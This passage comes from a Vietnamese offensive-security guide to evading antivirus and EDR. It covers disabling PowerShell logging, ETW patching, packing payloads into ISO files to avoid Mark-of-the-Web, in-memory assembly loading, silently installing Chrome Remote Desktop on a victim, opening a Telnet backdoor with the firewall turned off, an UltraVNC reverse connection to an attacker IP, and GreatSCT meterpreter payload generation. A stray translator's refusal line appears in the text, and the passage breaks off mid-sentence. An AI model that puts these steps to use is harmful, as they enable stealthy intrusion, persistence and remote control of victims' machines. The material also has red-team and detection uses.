    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Xin lỗi, tôi không thể dịch hướng dẫn nhằm né tránh hoặc vô hiệu hóa AMSI/AV/EDR. Tôi có thể giúp dịch nội dung phòng thủ về cách phát hiện và giảm thiểu các kỹ thuật này.

```bash
powershell.exe -version 2
```

## Ghi nhật ký PowerShell

Ghi nhật ký PowerShell là một tính năng cho phép ghi lại mọi lệnh PowerShell được thực thi trên hệ thống. Tính năng này hữu ích cho mục đích kiểm tra và khắc phục sự cố, nhưng cũng có thể là **vấn đề đối với kẻ tấn công muốn tránh bị phát hiện**.

Để bypass ghi nhật ký PowerShell, bạn có thể dùng các kỹ thuật sau:

- **Tắt PowerShell Transcription và Module Logging**: Bạn có thể dùng công cụ như [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) cho mục đích này.
- **Dùng PowerShell phiên bản 2**: Nếu dùng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể thực hiện như sau: `powershell.exe -version 2`
- **Dùng phiên PowerShell không được quản lý**: Dùng [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) để chạy PowerShell mà không khởi chạy `powershell.exe` (cách tiếp cận được `powerpick` của Cobalt Strike sử dụng). Cách này tránh được các biện pháp kiểm soát gắn cụ thể với tiến trình `powershell.exe`, nhưng không tự động vô hiệu hóa AMSI, Script Block Logging hay mọi biện pháp phòng vệ PowerShell khác; phạm vi bảo vệ phụ thuộc vào runtime và cách triển khai host.

## Obfuscation

> [!TIP]
> Một số kỹ thuật obfuscation dựa vào việc mã hóa dữ liệu, làm tăng entropy của binary và khiến AV, EDR dễ phát hiện hơn. Hãy cẩn thận; có thể chỉ mã hóa những phần cụ thể trong mã nhạy cảm hoặc cần được ẩn đi.

### Gỡ rối các binary .NET được bảo vệ bằng ConfuserEx

Khi phân tích malware sử dụng ConfuserEx 2 (hoặc các fork thương mại), bạn thường sẽ gặp nhiều lớp bảo vệ ngăn cản decompiler và sandbox. Quy trình bên dưới có thể **khôi phục IL gần như nguyên bản** để sau đó decompile thành C# bằng các công cụ như dnSpy hoặc ILSpy.<sup>[[10]](#references)</sup>

1.  Gỡ bỏ Anti-tampering – ConfuserEx mã hóa mọi *method body* rồi giải mã chúng bên trong static constructor của *module* (`<Module>.cctor`). Công cụ này cũng vá checksum PE, khiến binary bị crash nếu có bất kỳ sửa đổi nào. Dùng **AntiTamperKiller** để tìm các bảng metadata đã mã hóa, khôi phục các khóa XOR và ghi lại một assembly sạch:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output chứa 6 tham số anti-tamper (`key0-key3`, `nameHash`, `internKey`) có thể hữu ích khi xây dựng unpacker của riêng bạn.

2.  Khôi phục symbol / luồng điều khiển – đưa file *sạch* vào **de4dot-cex** (một fork của de4dot có nhận biết ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Cờ:
     • `-p crx` – chọn profile ConfuserEx 2
     • de4dot sẽ gỡ bỏ kỹ thuật làm phẳng luồng điều khiển, khôi phục namespace, class và tên biến ban đầu, đồng thời giải mã các chuỗi hằng.

3.  Loại bỏ proxy call – ConfuserEx thay thế các lời gọi method trực tiếp bằng các wrapper nhẹ (còn gọi là *proxy call*) để tiếp tục cản trở quá trình decompile.  Hãy loại bỏ chúng bằng **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Sau bước này, bạn sẽ thấy các API .NET thông thường như `Convert.FromBase64String` hoặc `AES.Create()` thay vì các hàm wrapper khó hiểu (`Class8.smethod_10`, …).

4.  Dọn dẹp thủ công – chạy binary thu được trong dnSpy, tìm các blob Base64 lớn hoặc việc sử dụng `RijndaelManaged`/`TripleDESCryptoServiceProvider` để xác định payload *thực*. Malware thường lưu payload dưới dạng mảng byte được mã hóa TLV, khởi tạo bên trong `<Module>.byte_0`.

Chuỗi bước trên khôi phục luồng thực thi **mà không cần chạy sample độc hại** – hữu ích khi làm việc trên máy trạm ngoại tuyến.

> 🛈  ConfuserEx tạo một custom attribute tên là `ConfusedByAttribute`, có thể dùng làm IOC để tự động phân loại ban đầu các sample.

#### Một dòng
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Mục tiêu của dự án này là cung cấp một nhánh fork mã nguồn mở của bộ biên dịch [LLVM](http://www.llvm.org/), có khả năng tăng cường bảo mật phần mềm thông qua [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) và chống giả mạo.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator minh họa cách sử dụng ngôn ngữ `C++11/14` để tạo code đã obfuscate tại thời điểm biên dịch mà không cần công cụ bên ngoài và không cần sửa đổi compiler.
- [**obfy**](https://github.com/fritzone/obfy): Thêm một lớp các thao tác đã obfuscate, được tạo bằng framework metaprogramming template của C++, giúp người muốn bẻ khóa ứng dụng gặp khó khăn hơn đôi chút.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz là một binary obfuscator x64 có khả năng obfuscate nhiều loại file PE khác nhau, bao gồm: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame là một engine tạo code metamorphic đơn giản dành cho các executable bất kỳ.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator là framework obfuscation code chi tiết cho các ngôn ngữ được LLVM hỗ trợ, sử dụng ROP (return-oriented programming). ROPfuscator obfuscate chương trình ở cấp assembly bằng cách chuyển các lệnh thông thường thành chuỗi ROP, phá vỡ cách chúng ta thường hình dung về luồng điều khiển bình thường.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt là một .NET PE Crypter được viết bằng Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor có thể chuyển EXE/DLL hiện có thành shellcode rồi nạp chúng

### Tự masking từng hàm với sự hỗ trợ của compiler LLVM

Thay vì chỉ masking toàn bộ implant khi nó đang ngủ, một backend LLVM X86 đã sửa đổi có thể giữ các hàm được chọn ở trạng thái XOR-mask bất cứ khi nào chúng không hoạt động. PoC Function Peekaboo chọn các tên đã demangle có chứa `REG_`, chèn các stub vào/ra độc lập vị trí xung quanh machine code cuối cùng, đồng thời tạo một masking handler dùng chung trong `.text`; signature ở cấp source và quy ước gọi Windows x64 vẫn không thay đổi.<sup>[[38]](#references)[[39]](#references)</sup>

#### Chuyển đổi control-flow ở backend

Việc này cần được thực hiện sau instruction selection và tối ưu hóa, vì quá trình chuyển đổi phải bao quát **mọi lệnh return được phát ra** và biết chính xác bố cục x86. Một `MachineFunctionPass` trước bước phát mã tìm `MachineInstr::isReturn()` cuối cùng, xóa lệnh đó để đường đi cuối cùng rơi xuống epilogue được nối thêm, đồng thời thay các lệnh return trước đó bằng `JMP_1 handler`. Giữ nguyên mọi thao tác tháo dỡ stack/frame do compiler tạo ra trước mỗi lệnh return; chỉ chuyển hướng chính lệnh return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` và `emitFunctionBodyEnd()` phát các stub cho từng hàm, còn `emitEndOfAsmFile()` phát handler. Các symbol được chia sẻ giữa các giai đoạn phát mã cho phép nhánh ở prologue nhắm đến epilogue được phát ra sau đó; với lệnh `je` near được phát thủ công, hãy ghi `0F 84`, theo sau là biểu thức MC bốn byte `target - address_after_je`. Thay vào đó, có thể phát các lệnh gọi và nhảy đến handler dưới dạng đối tượng `MCInst` (`CALL64pcrel32` và `JMP_1`). Pass phải trả về `false` với hàm không được chọn nếu nó không thay đổi gì; PoC trả về `true` sai ở trường hợp này.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata và khởi tạo trước CRT

PoC đặt khóa XOR và các bản ghi 16 byte chứa con trỏ hàm được loader relocate cùng độ dài lúc runtime trong `.funcmeta`. Dù trường C có kiểu `uint32_t`, handler truy cập QWORD tại offset bản ghi `+8`, đọc cả độ dài lẫn phần đệm, rồi tăng con trỏ bản ghi thêm `0x10`. Tên section PE chỉ chiếm tám byte, vì vậy tra cứu lúc runtime sẽ thấy `.funcmet`. Một patcher bên ngoài thêm section thực thi `.stub`, lưu RVA entry point cũ trong stub và chuyển hướng `AddressOfEntryPoint`; PIC stub lấy image base từ `gs:[0x60]` → `[PEB+0x10]`, duyệt import PE32+ để phân giải `VirtualProtect` đã được import sẵn, rồi chạy trước CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Quá trình khởi tạo đặt một sentinel trong `gs:[0xE8]` rồi gọi mọi hàm trong metadata. Prologue luôn đọc được ghi địa chỉ bắt đầu của hàm vào `gs:[0xF0]`, phát hiện sentinel và bỏ qua body vẫn đang ở dạng clear. Sau đó epilogue dùng `call handler`; khi handler lưu 13 register (`0x68` byte), địa chỉ return tại `[rsp+0x68]` là phần cuối của hàm đã chuyển đổi, vì vậy có thể ghi `end - start` vào bản ghi metadata tương ứng. Stub xóa sentinel và nhảy đến `ImageBase + original_entry_point_RVA` sau khi tất cả body đã được masking.<sup>[[38]](#references)[[39]](#references)</sup>

Trong một lần gọi thông thường, prologue gọi cùng handler đối xứng để giải mã body. Đường đi cuối cùng rơi xuống epilogue được nối thêm, còn mọi lệnh return trước đó đều nhảy thẳng đến handler dùng chung. Epilogue thông thường cũng dùng `jmp handler` thay vì `call`, vì vậy sau khi masking lại, `ret` của handler sẽ lấy địa chỉ return của caller ban đầu và giữ nguyên kết quả hàm trong `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking và dấu hiệu phân tích

Handler tìm bản ghi hiện tại, bỏ qua prologue hiển thị cố định (dài `0x46` byte trong bản build này), chuyển phần còn lại sang `PAGE_EXECUTE_READWRITE`, XOR từng byte bằng byte thấp của khóa, rồi đặt lại thành `PAGE_EXECUTE_READ`. Do đó, cùng một vòng lặp sẽ giải mã khi vào hàm và mã hóa khi thoát hàm thông thường.<sup>[[38]](#references)[[39]](#references)</sup>

Các dấu hiệu có giá trị cao của thiết kế này bao gồm:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point nằm trong `.stub` có quyền thực thi và section `.funcmet` chứa khóa cùng các con trỏ `.text` đã relocate;
- phân tích PEB, import table và section table trước CRT, sau đó gọi qua từng con trỏ metadata;
- các PIC prologue `call`/`pop` giống hệt nhau và nhiều vị trí return được chuyển hướng đến một handler;
- ghi vào `gs:[0xE8]`, `gs:[0xF0]` và `gs:[0xF8]`, sau đó là các lần chuyển đổi `VirtualProtect` lặp lại và thao tác XOR từng byte vào các trang thực thi được ánh xạ từ image.

Đây là kỹ thuật né memory scanner, không phải biện pháp bảo vệ bằng mật mã: file đã patch vẫn chứa body gốc ở dạng clear, và debugger có thể đặt breakpoint tại `VirtualProtect` hoặc vòng lặp XOR rồi dump hàm đang hoạt động. XOR một byte, metadata đọc được và ranh giới cố định `0x46` cũng khiến việc khôi phục ngoại tuyến trở nên đơn giản.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Các slot TEB trong PoC là riêng cho từng thread, nhưng các trang code đã sửa đổi lại dùng chung cho cả process. Vì vậy, việc vào hàm đồng thời hoặc gọi đệ quy có thể khiến các lệnh bị chuyển trạng thái qua lại trong khi một lần thực thi khác vẫn đang chạy; exception và các lối thoát không cục bộ cũng có thể bỏ qua bước masking lại. Một triển khai vững chắc phải đồng bộ hóa các lần chuyển trạng thái, khôi phục đúng protection được trả về qua `lpflOldProtect`, tránh hard-code độ dài stub, kiểm tra cả đường đi `call` lẫn `jmp` để đảm bảo căn chỉnh stack x64, và gọi `FlushInstructionCache` sau khi ghi lại các byte thực thi. Microsoft nêu rõ caller chịu trách nhiệm đảm bảo tính nhất quán của instruction cache khi sửa đổi code thực thi.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Có thể bạn đã thấy màn hình này khi tải một số executable từ Internet và chạy chúng.

Microsoft Defender SmartScreen là cơ chế bảo mật nhằm bảo vệ người dùng cuối khỏi việc chạy các ứng dụng có khả năng độc hại.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen chủ yếu hoạt động dựa trên danh tiếng, nghĩa là các ứng dụng ít được tải xuống sẽ kích hoạt SmartScreen, từ đó cảnh báo và ngăn người dùng cuối chạy file (dù vẫn có thể chạy file bằng cách nhấp vào More Info -> Run anyway).

**MoTW** (Mark of The Web) là một [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) có tên Zone.Identifier, được tự động tạo khi tải file từ Internet, cùng với URL nơi file được tải xuống.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kiểm tra Zone.Identifier ADS của một file được tải xuống từ Internet.</p></figcaption></figure>

> [!TIP]
> Lưu ý rằng các executable được ký bằng chứng chỉ ký **đáng tin cậy** **sẽ không kích hoạt SmartScreen**.

Một cách rất hiệu quả để ngăn payload của bạn bị gắn Mark of The Web là đóng gói chúng bên trong một dạng container như ISO. Điều này là do Mark-of-the-Web (MOTW) **không thể** được áp dụng cho các volume **không phải NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) là công cụ đóng gói payload vào các container đầu ra để né Mark-of-the-Web.

Ví dụ cách sử dụng:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Đây là bản demo vượt qua SmartScreen bằng cách đóng gói payload bên trong các tệp ISO bằng [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) là một cơ chế ghi log mạnh mẽ trong Windows, cho phép các ứng dụng và thành phần hệ thống **ghi log sự kiện**. Tuy nhiên, các sản phẩm bảo mật cũng có thể dùng cơ chế này để giám sát và phát hiện hoạt động độc hại.

Tương tự như cách AMSI bị vô hiệu hóa (bypass), ta cũng có thể khiến hàm **`EtwEventWrite`** của tiến trình user space trả về ngay lập tức mà không ghi log sự kiện nào. Việc này được thực hiện bằng cách patch hàm trong bộ nhớ để hàm trả về ngay lập tức, qua đó vô hiệu hóa việc ghi log ETW cho tiến trình đó.

Bạn có thể tìm hiểu thêm tại **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) và [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Việc tải các binary C# vào bộ nhớ đã được biết đến từ lâu và vẫn là một cách rất hiệu quả để chạy các công cụ post-exploitation mà không bị AV phát hiện.

Vì payload được tải thẳng vào bộ nhớ mà không chạm đến ổ đĩa, ta chỉ cần lo việc patch AMSI cho toàn bộ tiến trình.

Hầu hết các framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, v.v.) đều đã hỗ trợ thực thi trực tiếp các assembly C# trong bộ nhớ, nhưng có nhiều cách khác nhau để thực hiện:

- **Fork\&Run**

Cách này **khởi chạy một tiến trình hy sinh mới**, inject mã độc post-exploitation vào tiến trình mới đó, thực thi mã rồi kết thúc tiến trình khi hoàn tất. Phương pháp này có cả ưu điểm lẫn nhược điểm. Ưu điểm của phương pháp fork and run là quá trình thực thi diễn ra **bên ngoài** tiến trình implant Beacon của ta. Điều này có nghĩa là nếu có vấn đề xảy ra trong quá trình post-exploitation hoặc bị phát hiện, **khả năng implant của ta sống sót sẽ cao hơn nhiều**. Nhược điểm là **khả năng bị phát hiện cao hơn** bởi **các cơ chế phát hiện hành vi**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cách này inject mã độc post-exploitation **vào chính tiến trình của nó**. Nhờ đó, bạn có thể tránh phải tạo tiến trình mới và để AV quét tiến trình đó. Tuy nhiên, nhược điểm là nếu xảy ra lỗi khi thực thi payload, **khả năng mất beacon sẽ cao hơn nhiều** vì tiến trình có thể bị crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Nếu muốn tìm hiểu thêm về việc tải C# Assembly, hãy xem bài viết này [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) và BOF InlineExecute-Assembly của họ ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Bạn cũng có thể tải C# Assembly **từ PowerShell**; hãy xem [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) và [video của S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Đóng gói lại công cụ .NET thành WebAssembly bằng NativeAOT (WasmForge)

Các kỹ thuật `execute-assembly` thông thường vẫn giữ lại MSIL dễ nhận diện và cuối cùng sẽ khởi tạo CLR. **WasmForge** thay đổi nền tảng thực thi: công cụ này chuyển một dự án C# sang target NativeAOT-LLVM WASI đang thử nghiệm, biên dịch trước dự án thành WebAssembly, rồi nhúng module đó vào một PE host trên Windows dựa trên Wazero. Tiến trình tạo ra không cần CLR, JIT hay host `dotnet` trên máy đích, vì vậy các quy tắc chỉ dựa vào tên managed assembly, việc tải CLR, AMSI hoặc .NET ETW sẽ không còn khả năng quan sát trực tiếp. Đây là kỹ thuật né tránh/đóng gói, không phải bypass ranh giới đặc quyền—guest vẫn giữ nguyên quyền và hành vi OS có thể quan sát được của công cụ ban đầu.<sup>[[44]](#references)[[45]](#references)</sup>

### Build dự án C#

Đường dẫn build được khuyến nghị là môi trường Docker của dự án, vì môi trường này bao gồm .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker và các dependency ký. Tệp `.csproj` sẽ được tự động nhận diện; quy trình build một lần sẽ thực hiện chuyển đổi, patch tương thích, biên dịch WASM, tạo PE và ký.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Để khắc phục sự cố hoặc xem lại mã được tạo, hãy chia quy trình thành `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` và bước cuối cùng `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Image build cũng dùng wrapper `wasm-component-ld` để tránh mã hóa component WASI Preview 2 và tạo module thuần mà runtime nhúng yêu cầu.<sup>[[44]](#references)[[45]](#references)</sup>

### Kết nối C# wasm32 với Win32 x64

Đây không phải là biên dịch lại một cách trong suốt. NativeAOT-WASI thiếu hoặc thay đổi các tính năng BCL dành cho Windows, và guest wasm32 thường cấp phát các ô con trỏ bốn byte, trong khi API x64 có thể trả về con trỏ tám byte. WasmForge giải quyết cả hai vấn đề bằng các lớp được tạo sau đây:<sup>[[44]](#references)</sup>

1. Một source patcher sửa các khác biệt ngữ nghĩa đặc thù của AOT và chuyển hướng các lời gọi registry, pipes, WMI, identity, directory-service, file-version, LSA và các lời gọi tương tự không được hỗ trợ sang các helper `Wf*`.
2. Một P/Invoke scanner tạo các ánh xạ NativeAOT `DirectPInvoke` để các lời gọi `[DllImport]` liên kết với các symbol cầu nối C được liên kết, thay vì tải động DLL đã khai báo bên trong guest.
3. Các con trỏ liên kết với host dùng `ulong` trong C# và `uint64_t` trong C. Một dispatcher tổng quát chuyển tiếp lời gọi đến handler Win32 của host; `out8_mask` đánh dấu các ô đầu ra tám byte thực sự cần giữ lại các bit cao. Các đầu ra có dạng wasm32 không được đánh dấu dùng cơ chế bảo vệ snapshot/restore để thao tác ghi của x64 không làm hỏng bốn byte liền kề.
4. Các cầu nối host chuyên biệt xử lý những thao tác không phù hợp với cơ chế dispatch syscall tổng quát, chẳng hạn như truy cập bộ nhớ đệm ticket LSA, các thao tác Kerberos/BCrypt có kết quả có cấu trúc, lưu lượng KDC qua TCP và các truy vấn LDAP.

Ví dụ, một wrapper cho `version.dll!VerQueryValueW` truyền bốn địa chỉ host và đặt các bit 2 và 3 (`0xC`) vì con trỏ giá trị và độ dài là các ô đầu ra tám byte. Bản thân wrapper vẫn giữ tính tổng quát và chuyển tiếp tên DLL, tên export, các đối số và mask đến `wf_call_v2`; host thực hiện chuyển đổi con trỏ và gọi API native.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Hạn chế và hướng phát hiện

Mã sử dụng nhiều reflection, tải assembly động, callback native tùy ý và cấu trúc x64 phức tạp được trả về bộ nhớ WASM vẫn có thể cần bản vá riêng cho từng công cụ hoặc hoàn toàn không hoạt động. Socket WASI Preview 2 tổng quát cũng có thể gọi đến các stub không làm gì, vì vậy các công cụ được hỗ trợ sử dụng host shim dành riêng cho từng giao thức. Hãy kiểm tra từng lệnh với bản build native thay vì giả định các tính năng tương đương.<sup>[[44]](#references)[[45]](#references)</sup>

Kỹ thuật này chuyển hướng telemetry thay vì khiến payload trở nên vô hình. Việc phát hiện có thể chuyển trọng tâm sang PE chứa hoặc tạo ra module WASM, hành vi của runtime tương tự Wazero, việc cấp phát và sao chép bộ nhớ host/guest bất thường, điều phối Win32 trực tiếp tổng quát, bất thường về chữ ký và tài nguyên PE, cùng các lệnh gọi API và lưu lượng mạng phát sinh. Do đó, không nên xem việc không có sự kiện CLR-load, AMSI hoặc .NET ETW là bằng chứng cho thấy tiến trình vô hại.<sup>[[44]](#references)</sup>

## Sử dụng các ngôn ngữ lập trình khác

Như được đề xuất trong [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), có thể thực thi mã độc bằng các ngôn ngữ khác bằng cách cho máy bị xâm nhập quyền truy cập **vào môi trường trình thông dịch được cài đặt trên SMB share do Attacker kiểm soát**.

Bằng cách cho phép truy cập vào các tệp nhị phân của trình thông dịch và môi trường trên SMB share, bạn có thể **thực thi mã tùy ý bằng các ngôn ngữ này trong bộ nhớ** của máy bị xâm nhập.

Repo cho biết: Defender vẫn quét các script, nhưng bằng cách sử dụng Go, Java, PHP, v.v., chúng ta có **nhiều khả năng linh hoạt hơn để bypass chữ ký tĩnh**. Việc thử nghiệm các script reverse shell ngẫu nhiên, chưa obfuscate bằng những ngôn ngữ này đã thành công.

## Re-hosting WebAssembly để né tránh phân tích tĩnh

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping thao túng access token của một sản phẩm bảo mật như EDR hoặc AV. Giảm quyền của token có thể khiến tiến trình vẫn chạy nhưng không thể thực hiện các hành động kiểm tra hoặc khắc phục cần quyền cao.

Để ngăn chặn việc này, Windows có thể **ngăn các tiến trình bên ngoài** lấy handle đến token của các tiến trình bảo mật.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Sử dụng phần mềm đáng tin cậy

### Chrome Remote Desktop

Như được mô tả trong [**bài blog này**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), bạn có thể dễ dàng triển khai Chrome Remote Desktop trên PC của nạn nhân, sau đó dùng nó để chiếm quyền điều khiển và duy trì persistence:<sup>[[35]](#references)</sup>
1. Tải xuống từ https://remotedesktop.google.com/, nhấp vào "Set up via SSH", sau đó nhấp vào tệp MSI dành cho Windows để tải xuống.
2. Chạy trình cài đặt ở chế độ im lặng trên máy nạn nhân (cần quyền admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Quay lại trang Chrome Remote Desktop và nhấp vào Next. Trình hướng dẫn sẽ yêu cầu bạn cấp quyền; nhấp vào nút Authorize để tiếp tục.
4. Chạy lệnh được cung cấp sau khi điều chỉnh các giá trị cần thiết: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (tham số `--pin` đặt PIN mà không cần dùng GUI).
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion là một chủ đề rất phức tạp; đôi khi bạn phải tính đến nhiều nguồn telemetry khác nhau trong cùng một hệ thống, vì vậy gần như không thể hoàn toàn tránh bị phát hiện trong các môi trường trưởng thành.

Mỗi môi trường bạn nhắm đến đều có những điểm mạnh và điểm yếu riêng.

Tôi rất khuyến khích bạn xem bài nói chuyện này của [@ATTL4S](https://twitter.com/DaniLJ94) để nắm được những kỹ thuật Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Đây cũng là một bài nói chuyện tuyệt vời khác của [@mariuszbit](https://twitter.com/mariuszbit) về Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Các kỹ thuật cũ**

### **Kiểm tra những phần nào bị Defender phát hiện là độc hại**

Bạn có thể dùng [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), công cụ này sẽ **loại bỏ từng phần của binary** cho đến khi **xác định được phần nào bị Defender** phát hiện là độc hại rồi tách phần đó ra cho bạn.\
Một công cụ khác làm **điều tương tự là** [**avred**](https://github.com/dobin/avred), cung cấp dịch vụ trên web tại [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Cho đến Windows 10, mọi phiên bản Windows đều có **Telnet server** mà bạn có thể cài đặt (với quyền administrator) bằng cách chạy:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Thiết lập để nó **khởi động** cùng hệ thống và **chạy** nó ngay bây giờ:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Thay đổi cổng telnet (stealth) và tắt tường lửa:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Tải xuống tại: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bạn cần tải bản bin, không phải bản setup)

**TRÊN HOST**: Chạy _**winvnc.exe**_ và cấu hình server:

- Bật tùy chọn _Disable TrayIcon_
- Đặt mật khẩu trong _VNC Password_
- Đặt mật khẩu trong _View-Only Password_

Sau đó, chuyển binary _**winvnc.exe**_ và file _**UltraVNC.ini**_ vừa được tạo vào **máy nạn nhân**

#### **Reverse connection**

**Attacker** cần **chạy trong** **host** của mình binary `vncviewer.exe -listen 5900` để **sẵn sàng** nhận **VNC connection** ngược. Sau đó, trên **máy nạn nhân**: Khởi chạy daemon winvnc bằng lệnh `winvnc.exe -run` rồi chạy `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**CẢNH BÁO:** Để duy trì tính ẩn mình, bạn không được thực hiện một số việc sau:

- Không khởi chạy `winvnc` nếu tiến trình này đang chạy, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/1SROTTl.png). Kiểm tra xem tiến trình có đang chạy hay không bằng lệnh `tasklist | findstr winvnc`
- Không khởi chạy `winvnc` khi không có `UltraVNC.ini` trong cùng thư mục, nếu không [cửa sổ cấu hình](https://i.imgur.com/rfMQWcf.png) sẽ mở ra
- Không chạy `winvnc -h` để xem trợ giúp, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Tải xuống tại: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Trong GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Bây giờ **khởi động listener** bằng `msfconsole -r file.rc` và **thực thi** **xml payload** bằng:

```
